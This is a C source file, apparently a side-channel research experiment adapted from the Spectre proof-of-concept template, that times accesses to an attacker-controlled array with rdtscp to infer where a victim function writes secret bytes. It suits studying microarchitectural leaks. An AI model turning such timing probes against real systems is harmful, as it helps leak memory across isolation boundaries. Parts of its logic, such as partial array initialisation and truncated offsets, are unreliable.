/* Compile with "gcc -O0 -std=gnu99" */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 2048;
uint64_t times[4096];
uint8_t unused1[64];
uint8_t array1[2048];
uint8_t unused2[64];
//array4 the attacker has access to and will be used to get array1 offset
__attribute__((aligned(4096))) char array4[4096];

char* secret = "The password is rootkea" ;


void victim_function(size_t x){
	(array1+200)[x] = secret[x];
}

/********************************************************************
Analysis code
********************************************************************/

int GetUserArrayOffset(int score[2], uint8_t value[2])
{
	static int results[4096];
	int tries, i, j, k,junk=0;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++) {
		results[i] = 0;
		times[i] = 0;
	}

	for (tries = 4000; tries > 0; tries--) {
	
		for (i = 0; i < 4096; i++) {
			times[i] = 0;
		}
	
		for (i = 0; i < 4096; i++) {
			
			time1 = __rdtscp(&junk); /* READ TIMER */
			for (register int j = 0; j < 8192; ++j) {


				/* Call the victim! */
				victim_function(0);

                // Attempt to read from where the victim wrote to `array1`
				junk = array4[i];
			}
			
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			times[i] += time2;
		}

        /* Increment the highest access time offset.*/
		uint64_t max_time = 0;
		for (i = 0; i < 4096; i++) {
			if (times[i] > max_time) {
				max_time = times[i];
				j = i;
			}
		}
		results[j]++;
		
		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;

		for (i = 0; i < 4096; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
	}
	value[0] ^= junk; /* use junk so code above won't get optimized out */
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];

	for ( int w = 0 ; w< 4096; w++)
	{
		printf("results[%d]:%d\n",w,results[w]);
	}

	return j;
}
int main(int argc,
  const char * * argv) {
  int i, score[2];
  uint8_t value[2];
  int offset  = GetUserArrayOffset(score, value);
  printf("Victim array ptr: %p\n",(void *)(array1+200));
  printf("Best offset is : %d\n",offset);
  return (0);
}
